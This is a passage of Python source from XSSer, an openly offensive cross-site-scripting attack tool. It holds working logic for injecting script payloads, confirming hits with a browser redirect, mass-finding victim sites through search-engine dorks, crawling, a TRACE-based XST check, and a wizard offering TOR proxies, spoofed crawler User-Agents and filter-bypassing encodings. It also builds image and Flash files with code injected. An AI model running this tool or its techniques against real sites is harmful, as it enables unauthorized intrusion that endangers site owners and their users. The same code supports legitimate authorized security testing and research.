                    self.add_success(dest_url, payload, hashing, query_string, orig_url, attack_type)
                else:
                    if heuristic_param == "\\":
                        self.heuris_backslash_notfound = self.heuris_backslash_notfound + 1
                    elif heuristic_param == "/":
                        self.heuris_slash_notfound = self.heuris_slash_notfound + 1
                    elif heuristic_param == ">":
                        self.heuris_mayor_notfound = self.heuris_mayor_notfound + 1
                    elif heuristic_param == "<":
                        self.heuris_minor_notfound = self.heuris_minor_notfound + 1
                    elif heuristic_param == ";":
                        self.heuris_semicolon_notfound = self.heuris_semicolon_notfound + 1
                    elif heuristic_param == "'":
                        self.heuris_colon_notfound = self.heuris_colon_notfound + 1
                    elif heuristic_param == '"':
                        self.heuris_doublecolon_notfound = self.heuris_doublecolon_notfound + 1
                    elif heuristic_param == "=":
                        self.heuris_equal_notfound = self.heuris_equal_notfound + 1
            else:
                # only add a success if hashing is on body and we have a 200OK
                if hashing in curl_handle.body() and str(curl_handle.info()["http-code"]) == "200":
                    # some anti false positives manual checkers
                    if 'PAYLOAD' in payload['payload']:
                        user_attack_payload = payload['payload'].replace('PAYLOAD', url_orig_hash)
                        if str(options.discode) in curl_handle.body(): # provided by user
                            self.report("[!] Reply contains 'discode' provided... forcing failure!\n")
                            self.add_failure(dest_url, payload, hashing, query_string, attack_type)
                        else:
                            if str('/&gt;' + hashing) in curl_handle.body() or str('href=' + dest_url + hashing) in curl_handle.body() or str('content=' + dest_url + hashing) in curl_handle.body(): # provided by XSSer experience
                                self.report("[!] Reply looks a false positive from here. Try to inject it manually for check results... discarding!\n")
                                self.add_failure(dest_url, payload, hashing, query_string, attack_type)
                            else:
                                if options.discode:
                                    self.report("[+] Reply does not contain 'discode' provided... adding!\n")
                                self.add_success(dest_url, payload, hashing, query_string, orig_url, attack_type)
                else:
                    self.add_failure(dest_url, payload, hashing, query_string, attack_type)

    def add_failure(self, dest_url, payload, hashing, query_string, method='url'):
        """
        Add an attack that failed to inject
        """
        if payload['browser'] == "[Heuristic test]":
            pass
        else:
            self.report("[+] Checking: " + method + " attack with " + payload['payload'] + "... fail\n")
        options = self.options
        for reporter in self._reporters:
            reporter.add_failure(dest_url)
        if options.script:
            self.hash_notfound.append((dest_url, "Manual injection", method, hashing))
        else:
            self.hash_notfound.append((dest_url, payload['browser'], method, hashing))
        if options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("Injection failed!\n")

    def add_success(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
        """
        Add an attack that managed to inject the code
        """
        if payload['browser'] == "[manual_injection]":
            self.report("[+] Checking: " + method + " attack with " + payload['payload'].strip() + "... ok\n")
        elif payload['browser'] == "[Heuristic test]":
            pass
        else:
            self.report("[+] Checking: " + method + " attack with " + payload['payload'].strip() + "... ok\n")
        for reporter in self._reporters:
            reporter.add_success(dest_url)
        if self.options.reversecheck:
            if self.options.dcp or self.options.inducedcode or self.options.dom:
                pass
            else:
                self.do_token_check(orig_url, hashing, payload, query_string, dest_url)
        self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
        if self.options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("This injection is reflected by target so can be a vulnerability!! :)\n")
            self.report("Try --reverse-check connection to certify that is 100% vulnerable\n")

    def do_token_check(self, orig_url, hashing, payload, query_string, dest_url):
        self.report("[-] Trying reverse connection from:", orig_url + query_string)
        if "VECTOR" in orig_url:
            dest_url = orig_url
        else:
            if not dest_url.endswith("/"):
                dest_url = dest_url + "/"
            dest_url = orig_url + query_string + payload['payload']

        tok_url = None
        self_url = "http://localhost:19084/success/" + hashing
        shadow_js_inj = "document.location=document.location.hash.substring(1)"
        shadow_inj = "<script>" + shadow_js_inj + "</script>"
        shadow_js_inj = shadow_js_inj
        dest_url = dest_url.split("#")[0]

        def requote(what):
            return urllib.quote_plus(what)
        vector_and_payload = payload['payload']
        _e = self.encoding_permutations
        if 'VECTOR' in dest_url:
            dest_url = dest_url.replace('VECTOR', vector_and_payload)
        if '">PAYLOAD' in dest_url:
            tok_url = dest_url.replace('">PAYLOAD', _e('">' + shadow_inj))
            tok_url += '#' + self_url
        elif "'>PAYLOAD" in dest_url:
            tok_url = dest_url.replace("'>PAYLOAD", _e("'>" + shadow_inj))
            tok_url += '#' + self_url
        elif "javascript:PAYLOAD" in dest_url:
            tok_url = dest_url.replace('javascript:PAYLOAD',
                                       self.encoding_permutations("window.location='" + self_url+"';"))
            tok_url = dest_url.replace("javascript:PAYLOAD",
                                       _e("javascript:" + shadow_js_inj))
            tok_url+= '#' + self_url
        elif '"PAYLOAD"' in dest_url:
            tok_url = dest_url.replace('"PAYLOAD"', '"' + self_url + '"')
        elif "'PAYLOAD'" in dest_url:
            tok_url = dest_url.replace("'PAYLOAD'", "'" + self_url + "'")
        elif 'PAYLOAD' in dest_url and 'SRC' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)
        elif "SCRIPT" in dest_url:
            tok_url = dest_url.replace('PAYLOAD',
                                      shadow_js_inj)
            tok_url += '#' + self_url
        elif 'onerror="PAYLOAD"' in dest_url:
            tok_url = dest_url.replace('onerror="PAYLOAD"', _e('onerror="' + shadow_inj + '"'))
            tok_url+= '#' + self_url
        elif 'onerror="javascript:PAYLOAD"' in dest_url:
            tok_url = dest_url.replace('javascript:PAYLOAD',
            				self.encoding_permutations("window.location='" + self_url+"';"))
            tok_url = dest_url.replace('onerror="javascript:PAYLOAD"',
                                       _e('onerror="javascript:' + shadow_js_inj + '"'))
            tok_url+= '#' + self_url
        elif '<PAYLOAD>' in dest_url:
            tok_url = dest_url.replace("<PAYLOAD>", _e(shadow_inj))
            tok_url+= '#' + self_url
        elif 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace("PAYLOAD", _e(shadow_inj))
            tok_url+= '#' + self_url
        elif 'href' in dest_url and 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)
        elif 'HREF' in dest_url and 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)
        elif 'url' in dest_url and 'PAYLOAD' in dest_url:
            tok_url = dest_url.replace('PAYLOAD', self_url)

        self.final_attacks[hashing] = {'url': tok_url}
        if tok_url:
            self._webbrowser.open(tok_url)
        else:
            print("Cant apply any heuristic for final check on url: " + dest_url)

    def _report_attack_failure(self, curl_handle, dest_url, payload,\
                               attack_vector, orig_url, url_orig_hash):
        """
        report failure of an attack
        """
        options = self.options
        self.hash_notfound.append((dest_url, payload['browser'], "errorcode"))
        self.report("-"*45)
        for reporter in self._reporters:
            reporter.add_failure(dest_url)
        if payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]" or payload['browser'] == "[Heuristic test]":
            pass
        else:
            self.report("[-] Hashing: " + url_orig_hash)

        if payload['browser'] == "[Heuristic test]":
            self.report("[+] Trying: " + str(payload['payload']).strip('XSS'))
        else:
            if options.postdata:
                try:
                    self.report("[+] Trying: " + dest_url.strip(), "(POST:", query_string + ")")
                except:
                    self.report("[+] Trying: " + dest_url.strip(), "(POST)")
            else:
                self.report("[+] Trying: " + urllib.unquote(dest_url.strip()))
        self.report("[+] Browser Support: " + payload['browser'])
 
	# statistics injections counters
        if payload['browser']=="[hashed_precheck_system]" or payload['browser']=="[Heuristic test]":
            self.check_positives = self.check_positives + 1
        elif payload['browser']=="[Data Control Protocol Injection]":
            self.dcp_injection = self.dcp_injection + 1
        elif payload['browser']=="[Document Object Model Injection]":
            self.dom_injection = self.dom_injection + 1
        elif payload['browser']=="[Induced Injection]":
            self.httpsr_injection = self.httpsr_injection + 1
        elif payload['browser']=="[manual_injection]":
            self.manual_injection = self.manual_injection + 1
        else:
            self.auto_injection = self.auto_injection +1

        if options.verbose:
            self.report("[-] Headers Results:\n")
            self.report(str(curl_handle.info()))
            self.report("-"*45)

        self.report("[-] Injection Results:")

        if str(curl_handle.info()["http-code"]) == "404":
            self.report("\n404 Not Found: The server has not found anything matching the Request-URI\n")
        elif str(curl_handle.info()["http-code"]) == "403":
            self.report("\n403 Forbidden: The server understood the request, but is refusing to fulfill it\n")
        elif str(curl_handle.info()["http-code"]) == "400":
            self.report("\n400 Bad Request: The request could not be understood by the server due to malformed syntax\n")
        elif str(curl_handle.info()["http-code"]) == "401":
            self.report("\n401 Unauthorized: The request requires user authentication\n\nIf you are trying to authenticate: Login is failing!\n\ncheck:\n- authentication type is correct for the type of realm (basic, digest, gss, ntlm...)\n- credentials 'user:password' are correctly typed\n")
        elif str(curl_handle.info()["http-code"]) == "407":
            self.report("\n407 Proxy Authentication Required: XSSer must first authenticate itself with the proxy\n")
        elif str(curl_handle.info()["http-code"]) == "408":
            self.report("\n408 Request Timeout: XSSer did not produce a request within the time that the server was prepared to wait\n")
        elif str(curl_handle.info()["http-code"]) == "500":
            self.report("\n500 Internal Server Error: The server encountered an unexpected condition which prevented it from fulfilling the request\n")
        elif str(curl_handle.info()["http-code"]) == "501":
            self.report("\n501 Not Implemented: The server does not support the functionality required to fulfill the request\n")
        elif str(curl_handle.info()["http-code"]) == "502":
            self.report("\n502 Bad Gateway: The server received an invalid response from the upstream server.\n")
        elif str(curl_handle.info()["http-code"]) == "503":
            self.report("\n503 Service Unavailable: The server is currently unable to handle the request due to a temporary overloading\n")
        elif str(curl_handle.info()["http-code"]) == "504":
            self.report("\n504 Gateway Timeout: The server did not receive a timely response specified by the URI (try: --ignore-proxy)\n")
        elif str(curl_handle.info()["http-code"]) == "0":
            self.report("\nXSSer is not working properly!:\n - Is something blocking connection(s)?\n - Is target url ok?: (" + orig_url + ")\n")
        else:
            self.report("\nNot injected!. Server responses with http-code different to: 200 OK (" + str(curl_handle.info()["http-code"]) + ")\n")

        if self.options.statistics:
            if str(curl_handle.info()["http-code"]) == "404":
                self.not_connection = self.not_connection + 1
            elif str(curl_handle.info()["http-code"]) == "503":
                self.forwarded_connection = self.forwarded_connection + 1
            else:
                self.other_connection = self.other_connection + 1

    def check_positive(self, curl_handle, dest_url, payload, attack_vector):
        """
        Perform extra check for positives
        """
        body = curl_handle.body()
        # should check ongoing_attacks here
        # perform extra checks
        pass

    def create_options(self, args=None):
        """
        Create options for OptionParser.
        """
        self.optionParser = XSSerOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def _get_attack_urls(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        urls = []
        options = self.options
        p = self.optionParser
        if options.imx:
            self.create_fake_image(options.imx, options.script)
            return []

        if options.flash:
            self.create_fake_flash(options.flash, options.script)
            return []

        if options.update:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            try:
                print("\nTrying to update automatically to the latest stable version\n")
                Updater() 
            except:
                print("\nSomething was wrong!. You should clone XSSer manually with:\n")
                print("$ git clone https://github.com/epsylon/xsser\n")
            return []
        
        if options.wizard: # processing wizard template
           if self.user_template is not None:
               self.options.statistics = True # detailed output
               if self.user_template[0] == "DORKING": # mass-dorking
                   self.options.dork_file = True
                   self.options.dork_mass = True
               elif "http" in self.user_template[0]: # from target url
                   self.options.url = self.user_template[0]
               else: # from file
                   self.options.readfile = self.user_template[0]
               if self.user_template[1] == "CRAWLER": # crawlering target
                   self.options.crawling = "10"
               else: # manual payload (GET or POST)
                   if self.user_template_conntype == "GET":
                       self.options.getdata = self.user_template[1]
                   else:
                       self.options.postdata = self.user_template[1]
               if self.user_template[2] == "Proxy: No - Spoofing: Yes":
                   self.options.ignoreproxy = True
                   self.options.agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search" # spoof agent
                   self.options.referer = "127.0.0.1" # spoof referer
               elif self.user_template[2] == "Proxy: No - Spoofing: No":
                   self.options.ignoreproxy = True
               else: # using proxy + spoofing
                   self.options.agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search" # spoof agent
                   self.options.referer = "127.0.0.1" # spoof referer
                   if self.user_template[2] is not None:
                       self.options.proxy = self.user_template[2]
                   else:
                       self.options.ignoreproxy = True
               if self.user_template[3] == "Not using encoders":
                   pass
               elif self.user_template[3] == "Hex": # Hexadecimal
                   self.options.Hex = True
               elif self.user_template[3] == "Str+Une": # StringFromCharCode()+Unescape()
                   self.options.Str = True
                   self.options.Une = True
               else: # Character encoding mutations
                   self.options.Cem = self.user_template[3]
               if self.user_template[4] == "Alertbox": # Classic AlertBox injection
                   self.options.finalpayload = "<script>alert('XSS');</script>"
               else:
                   if self.user_template[4] is not None: # Inject user script
                       self.options.finalpayload = self.user_template[4]
                   else: # not final injection
                       pass 
           else: # exit
               return

        if options.target: # miau!
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [Full XSS audit]... Searching for lulz?! ;-)")
            self.report('='*75)
            self.report("\n[Info] The following actions will be performed at the end:\n")
            self.report("  1- Output with detailed statistics\n")
            self.report("  2- Export results to files: [XSSreport.raw] - [XSSer_<target>_<datetime>.xml]\n")
            self.report("-"*22)
            print '[Info] Good fly... and happy "Cross" hacking !!! :-)'
            self.options.crawling = "99999" # set max num of urls to crawl
            self.options.crawler_width = "5" # set max num of deeping levels
            self.options.statistics = True # detailed output
            self.options.timeout = "60" # timeout
            self.options.retries = "2" # retries  
            self.options.delay = "5" # delay
            self.options.threads = "10" # threads
            self.options.followred = True # follow redirs
            self.options.nohead = True # no HEAD check
            self.options.reversecheck = True # establish reverse connection 
            self.options.fuzz = True # autofuzzing 
            self.options.coo = True # COO
            self.options.xsa = True # XSA
            self.options.xsr = True # XSR
            self.options.dcp = True # DCP
            self.options.dom = True # DOM
            self.options.inducedcode = True # Induced
            self.options.fileoutput = True # Important: export results to file (.raw)
            self.options.filexml = "XSSer_" + str(self.options.target) + "_" + str(datetime.datetime.now())+".xml" # export xml
            self.check_trace() # XST
            urls = [options.target]

        if options.url:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from URL]...")
            self.report('='*75)
            urls = [options.url]

        elif options.readfile:
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from file]...")
            self.report('='*75)
            try:
                f = open(options.readfile)
                urls = f.readlines()
                urls = [ line.replace('\n','') for line in urls ]
                f.close()
            except:
                import os.path
                if os.path.exists(options.readfile) == True:
                    self.report('\nThere are some errors opening the file: ', options.readfile, "\n")
                else:
                    self.report('\nCannot found file: ', options.readfile, "\n")

        elif options.dork: # dork a query
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from Dork-Query]... Good luck! ;-)")
            self.report('='*75)
            if options.dork_mass: # massive dorkering
                for e in self.search_engines:
                    try:
                        dorker = Dorker(e)
                        urls = dorker.dork(options.dork)
                        i = 0
                        for u in urls: # replace original parameter for injection keyword (XSS)
                            p_uri = urlparse(u)
                            uri = p_uri.netloc
                            path = p_uri.path
                            target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                            for key, value in target_params.iteritems(): # parse params to apply keywords
                                for v in value:
                                    target_params[key] = 'XSS'
                            target_url_params = urllib.urlencode(target_params)
                            u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                            urls[i] = u
                            i = i + 1
                    except Exception, e:
                        for reporter in self._reporters:
                            reporter.mosquito_crashed(dorker.search_url, str(e.message))
                    else:
                        if urls is not None:
                            for url in urls:
                                for reporter in self._reporters:
                                    reporter.add_link(dorker.search_url, url)
            else:
                if not options.dork_engine:
                    options.dork_engine = 'yahoo' # default search engine [09-04/2018]
                dorker = Dorker(options.dork_engine)
                try:
                    urls = dorker.dork(options.dork)
                    i = 0
                    for u in urls: # replace original parameter for injection keyword (XSS)
                        p_uri = urlparse(u)
                        uri = p_uri.netloc
                        path = p_uri.path
                        target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                        for key, value in target_params.iteritems(): # parse params to apply keywords
                            for v in value:
                                target_params[key] = 'XSS'
                        target_url_params = urllib.urlencode(target_params)
                        u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                        urls[i] = u
                        i = i + 1
                except Exception, e:
                    for reporter in self._reporters:
                        reporter.mosquito_crashed(dorker.search_url, str(e.message))
                else:
                    if urls is not None:
                        for url in urls:
                            for reporter in self._reporters:
                                reporter.add_link(dorker.search_url, url)

        elif options.dork_file: # dork from file ('core/fuzzing/dorks.txt')
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("Testing [XSS from Dork-File]... Good luck! ;-)")
            self.report('='*75)
            try:
                f = open('core/fuzzing/dorks.txt')
                dorks = f.readlines()
                dorks = [ dork.replace('\n','') for dork in dorks ]
                f.close()
                if not dorks:
                    print "\n[Error] - Imposible to retrieve 'dorks' from file.\n"
                    return
            except:
                if os.path.exists('core/fuzzing/dorks.txt') == True:
                    print '[Error] - Cannot open:', 'dorks.txt', "\n"
                    return 
                else:
                    print '[Error] - Cannot found:', 'dorks.txt', "\n"
                    return
            if not options.dork_engine:
                options.dork_engine = 'yahoo' # default search engine [09-04/2018]
            if options.dork_mass: # massive dorkering
                for e in self.search_engines:
                    try:
                        dorker = Dorker(e)
                        for dork in dorks:
                            urls = dorker.dork(dork)
                        i = 0
                        for u in urls: # replace original parameter for injection keyword (XSS)
                            p_uri = urlparse(u)
                            uri = p_uri.netloc
                            path = p_uri.path
                            target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                            for key, value in target_params.iteritems(): # parse params to apply keywords
                                for v in value:
                                    target_params[key] = 'XSS'
                            target_url_params = urllib.urlencode(target_params)
                            u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                            urls[i] = u
                            i = i + 1
                    except Exception, e:
                        for reporter in self._reporters:
                            reporter.mosquito_crashed(dorker.search_url, str(e.message))
                    else:
                        if urls is not None:
                            for url in urls:
                                for reporter in self._reporters:
                                    reporter.add_link(dorker.search_url, url)
            else:
                dorker = Dorker(options.dork_engine)
                try:
                    for dork in dorks:
                        urls = dorker.dork(dork)
                    i = 0
                    for u in urls: # replace original parameter for injection keyword (XSS)
                        p_uri = urlparse(u)
                        uri = p_uri.netloc
                        path = p_uri.path
                        target_params = parse_qs(urlparse(u).query, keep_blank_values=True)
                        for key, value in target_params.iteritems(): # parse params to apply keywords
                            for v in value:
                                target_params[key] = 'XSS'
                        target_url_params = urllib.urlencode(target_params)
                        u = p_uri.scheme + "://" + uri + path + "?" + target_url_params
                        urls[i] = u
                        i = i + 1
                except Exception, e:
                    for reporter in self._reporters:
                        reporter.mosquito_crashed(dorker.search_url, str(e.message))
                else:
                    if urls is not None:
                        for url in urls:
                            for reporter in self._reporters:
                                reporter.add_link(dorker.search_url, url)

        if options.crawling: # crawlering target(s)
            nthreads = options.threads
            self.crawled_urls = list(urls)
            all_crawled = []
            if self.options.crawler_width == None:
                self.options.crawler_width = 3 # default crawlering-width
            if self.options.crawler_local == None:
                self.options.crawler_local = True # default local-crawlering
            for url in set(urls):
                self.report("\n[Info] Crawlering:", url, "- Max limit: ["+ options.crawling+ "] - Deep level: ["+ str(options.crawler_width) + "]")
                self.report("\n", "-"*22)
            crawler = Crawler(self, Curl, all_crawled,
                              self.pool)
            crawler.set_reporter(self)
            # now wait for all results to arrive
            while urls:
                self.run_crawl(crawler, urls.pop(), options)
            while not self._landing:
                for reporter in self._reporters:
                    reporter.report_state('broad scanning')
                try:
                    self.pool.poll()
                except NoResultsPending:
                    crawler.cancel()
                    break
                if len(self.crawled_urls) >= int(options.crawling) or not crawler._requests:
                    self.report("\n[Info] Found enough results... calling all mosquitoes to home!")
                    crawler.cancel()
                    break
                time.sleep(0.1)
            self.report("\n", "-"*22)
            self.report("\n[Info] Mosquitoes found: " + str(len(self.crawled_urls)) + " payload(s)!\n")
            return self.crawled_urls
     
        if not options.imx or not options.flash or not options.xsser_gtk or not options.update:
            return urls
            
    def run_crawl(self, crawler, url, options):
        def _cb(request, result):
            pass

        def _error_cb(request, error):
            for reporter in self._reporters:
                reporter.mosquito_crashed(url, str(error[0]))
            traceback.print_tb(error[2])

        def crawler_main(args):
            return crawler.crawl(*args)
        crawler.crawl(url, int(options.crawler_width),
                      int(options.crawling),options.crawler_local)
        
    def poll_workers(self):
        try:
            self.pool.poll()
        except NoResultsPending:
            pass

    def try_running(self, func, error, args=[]):
        """
        Try running a function and print some error if it fails and exists with
        a fatal error.
        """
        try:
            return func(*args)
        except Exception, e:
            self.report(error, "error")
            if DEBUG:
                traceback.print_exc()
 
    def check_trace(self):
        """
        Check for Cross Site Tracing (XST) vulnerability: 
            1) check HTTP TRACE method enabled (add 'Max-Forwards: 0' to curl command to bypass some 'Anti-antixst' web proxy rules) 
            2) check data sent on reply 
        """
        agent = 'Googlebot/2.1b'
        referer = '127.0.0.1'
        import subprocess, shlex
        if self.options.xst:
            xst = subprocess.Popen(shlex.split('curl -q -s -i -m 30 -A ' + agent + ' -e ' + referer + ' -X TRACE ' + self.options.xst), stdout=subprocess.PIPE)
        if self.options.target:
            xst = subprocess.Popen(shlex.split('curl -q -s -i -m 30 -A ' + agent + ' -e ' + referer + ' -X TRACE ' + self.options.target), stdout=subprocess.PIPE)
        line1 = xst.stdout.readline()
        print ""
        while True:
            line = xst.stdout.readline()
            if line != '':
                print line.rstrip()
            else:
                break
        print ""
        self.report('='*75)
        if "200 OK" in line1.rstrip():
            print "[Info] Target is vulnerable to XST! (Cross Site Tracing) ;-)"
        else:
            print "[Info] Target is NOT vulnerable to XST (Cross Site Tracing) ..."
        if self.options.target:
            self.report('='*75)
 
    def start_wizard(self):
        """
        Start Wizard Helper
        """
        #step 0: Menu
        ans1=True
        ans2=True
        ans3=True
        ans4=True
        ans5=True
        ans6=True

        #step 1: Where
        while ans1:
            print("""\nA)- Where are your targets?\n
             [1]- I want to enter the url of my target directly.
             [2]- I want to enter a list of targets from a .txt file.
            *[3]- I don't know where are my target(s)... I just want to explore! :-)
             [e]- Exit/Quit/Abort.
            """)
            ans1 = raw_input("Your choice: [1], [2], [3] or [e]xit\n")
            if ans1 == "1": # from url
                url = raw_input("Target url (ex: http(s)://target.com): ")
                if url.startswith("http"):
                    ans1 = None
                else:
                    print "\n[Error] Your url is not valid!. Try again!"
                    pass
            elif ans1 == "2": # from file
                url = raw_input("Path to file (ex: 'targets_list.txt'): ")
                if url == None:
                    print "\n[Error] Your are not providing a valid file. Try again!"
                    pass
                else:
                    ans1 = None
            elif ans1 == "3": # dorking
                url = "DORKING" 
                ans1 = None
            elif (ans1 == "e" or ans1 == "E"):
                print "Closing wizard..."
                ans1=None
                ans2=None
                ans3=None
                ans4=None
                ans5=None
                ans6=None
            else:
                print "\nNot valid choice. Try again!"

        #step 2: How
        while ans2:
            print 22*"-"
            print("""\nB)- How do you want to connect?\n
             [1]- I want to connect using GET and select some possible vulnerable parameter(s) directly.
             [2]- I want to connect using POST and select some possible vulnerable parameter(s) directly.
             [3]- I want to "crawl" all the links of my target(s) to found as much vulnerabilities as possible.
            *[4]- I don't know how to connect... Just do it! :-)
             [e]- Exit/Quit/Abort.
            """)
            ans2 = raw_input("Your choice: [1], [2], [3], [4] or [e]xit\n")
            if ans2 == "1": # using GET
                payload = raw_input("GET payload (ex: '/menu.php?q='): ")
                if payload == None:
                    print "\n[Error] Your are providing an empty payload. Try again!"
                    pass
                else:
                    self.user_template_conntype = "GET"
                    ans2 = None
            elif ans2 == "2": # using POST
                payload = raw_input("POST payload (ex: 'foo=1&bar='): ")
                if payload == None:
                    print "\n[Error] Your are providing an empty payload. Try again!"
                    pass
                else:
                    self.user_template_conntype = "POST"
                    ans2 = None
            elif ans2 == "3": # crawlering
                payload = "CRAWLER" 
                ans2 = None
            elif ans2 == "4": # crawlering
                payload = "CRAWLER"
                ans2 = None
            elif (ans2 == "e" or ans2 == "E"):
                print "Closing wizard..."
                ans2=None
                ans3=None
                ans4=None
                ans5=None
                ans6=None
            else:
                print "\nNot valid choice. Try again!"

        #step 3: Proxy
        while ans3:
            print 22*"-"
            print("""\nC)- Do you want to be 'anonymous'?\n
             [1]- Yes. I want to use my proxy and apply automatic spoofing methods.
             [2]- Anonymous?. Yes!!!. I have a TOR proxy ready at: http://127.0.0.1:8118. 
            *[3]- Yes. But I haven't any proxy. :-)
             [4]- No. It's not a problem for me to connect directly to the target(s).
             [e]- Exit/Quit.
            """)
            ans3 = raw_input("Your choice: [1], [2], [3], [4] or [e]xit\n")
            if ans3 == "1": # using PROXY + spoofing
                proxy = raw_input("Enter proxy [http(s)://server:port]: ")
                ans3 = None
            elif ans3 == "2": # using TOR + spoofing
                proxy = 'Using TOR (default: http://127.0.0.1:8118)'
                proxy = 'http://127.0.0.1:8118'
                ans3 = None
            elif ans3 == "3": # only spoofing
                proxy = 'Proxy: No - Spoofing: Yes' 
                ans3 = None
            elif ans3 == "4": # no spoofing
                proxy = 'Proxy: No - Spoofing: No'
                ans3 = None
            elif (ans3 == "e" or ans3 == "E"):
                print "Closing wizard..."
                ans3=None
                ans4=None
                ans5=None
                ans6=None
            else:
                print "\nNot valid choice. Try again!"

        #step 4: Bypasser(s)
        while ans4:
            print 22*"-"
            print("""\nD)- Which 'bypasser(s' do you want to use?\n
             [1]- I want to inject XSS scripts without any encoding.
             [2]- Try to inject code using 'Hexadecimal'.
             [3]- Try to inject code mixing 'String.FromCharCode()' and 'Unescape()'.
             [4]- I want to inject using 'Character Encoding Mutations' (Une+Str+Hex). 
            *[5]- I don't know exactly what is a 'bypasser'... But I want to inject code! :-)
             [e]- Exit/Quit.
            """)
            ans4 = raw_input("Your choice: [1], [2], [3], [4], [5] or [e]xit\n")
            if ans4 == "1": # no encode
                enc = "Not using encoders"
                ans4 = None
            elif ans4 == "2": # enc: Hex
                enc = 'Hex'
                ans4 = None
            elif ans4 == "3": # enc: Str+Une
                enc = 'Str+Une' 
                ans4 = None
            elif ans4 == "4": # enc: Mix: Une+Str+Hex
                enc = "Une,Str,Hex"
                ans4 = None
            elif ans4 == "5": # enc: no encode
                enc = 'Not using encoders' 
                ans4 = None
            elif (ans4 == "e" or ans4 == "E"):
                print "Closing wizard..."
                ans4=None
                ans5=None
                ans6=None
            else:
                print "\nNot valid choice. Try again!"

        #step 5: Exploiting
        while ans5:
            print 22*"-"
            print("""\nE)- Which final code do you want to 'exploit' on vulnerabilities found?\n
             [1]- I want to inject a classic "Alert" message box.
             [2]- I want to inject my own scripts.
            *[3]- I don't want to inject a final code... I just want to discover vulnerabilities! :-)
             [e]- Exit/Quit.
            """)
            ans5 = raw_input("Your choice: [1], [2], [3] or [e]xit\n")
            if ans5 == "1": # alertbox
                script = 'Alertbox'
                ans5 = None
            elif ans5 == "2": # manual
                script = raw_input("Enter code (ex: '><script>alert('XSS');</script>): ")
                if script == None:
                    print "\n[Error] Your are providing an empty script to inject. Try again!"
                    pass
                else:
                    ans5 = None
            elif ans5 == "3": # no exploit
                script = 'Not exploiting code' 
                ans5 = None
            elif (ans5 == "e" or ans5 == "E"):
                print "Closing wizard..."
                ans5=None
                ans6=None
            else:
                print "\nNot valid choice. Try again!"

        #step 6: Final
        while ans6:
            print 22*"-"
            print "\nVery nice!. That's all. Your last step is to -accept or not- this template.\n"
            print "A)- Target:", url
            print "B)- Payload:", payload
            print "C)- Privacy:", proxy
            print "D)- Bypasser(s):", enc
            print "E)- Final:", script
            print("""
            [Y]- Yes. Accept it and start testing!.
            [N]- No. Abort it?.
            """)
            ans6 = raw_input("Your choice: [Y] or [N]\n")
            if (ans6 == "y" or ans6 == "Y"): # YES
                start = 'YES'
                print 'Good fly... and happy "Cross" hacking !!! :-)\n'
                ans6 = None
            elif (ans6 == "n" or ans6 == "N"): # NO
                start = 'NO'
                print "Aborted!. Closing wizard..."
                ans6 = None
            else:
                print "\nNot valid choice. Try again!"
            if url and payload and proxy and enc and script:
                return url, payload, proxy, enc, script
            else:
                return

    def create_fake_image(self, filename, payload):
        """
        Create -fake- image with code injected
        """
        options = self.options
        filename = options.imx
        payload = options.script
        image_xss_injections = ImageInjections()
        image_injections = image_xss_injections.image_xss(options.imx , options.script)
        return image_injections

    def create_fake_flash(self, filename, payload):
        """
        Create -fake- flash movie (.swf) with code injected
    	"""
        options = self.options
        filename = options.flash
        payload = options.script
        flash_xss_injections = FlashInjections()
        flash_injections = flash_xss_injections.flash_xss(options.flash, options.script)
        return flash_injections

    def create_gtk_interface(self):
        """
        Create GTK Interface
        """
        options = self.options
        from core.gtkcontroller import Controller, reactor
        uifile = "xsser.ui"
        controller = Controller(uifile, self)
        self._reporters.append(controller)
        if reactor:
            reactor.run()
        else:
            import gtk
            gtk.main()
        return controller

    def run(self, opts=None):
        """
        Run xsser.
        """
        self._landing = False
        for reporter in self._reporters:
            reporter.start_attack()
        if opts:
            options = self.create_options(opts)
            self.set_options(options)

        if not self.mothership and not self.hub:
            self.hub = HubThread(self)
            self.hub.start()

        options = self.options
        # step 0: third party tricks
        try:
            if self.options.imx: # create -fake- image with code injected
                p = self.optionParser
                self.report('='*75)
                self.report(str(p.version))
                self.report('='*75)
                self.report("[Image XSS auto-builder]... remember; only IE6 and versions below.")
                self.report('='*75)
                self.report(''.join(self.create_fake_image(self.options.imx, self.options.script)))
                self.report('='*75 + "\n")
        except:
            return

        if options.flash: # create -fake- flash movie (.swf) with code injected
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[Flash Attack! XSS auto-builder]... ready to be embedded ;)")
            self.report('='*75)
            self.report(''.join(self.create_fake_flash(self.options.flash, self.options.script)))
            self.report('='*75 + "\n")

        if options.xsser_gtk:
            self.create_gtk_interface()
            return

        if self.options.wizard: # start a wizard helper
            p = self.optionParser
            self.report('='*75)
            self.report(str(p.version))
            self.report('='*75)
            self.report("[Wizard] Generating XSS attack...")
            self.report('='*75)
            self.user_template = self.start_wizard()

        if self.options.xst: # check for cross site tracing
            p = self.optionParser
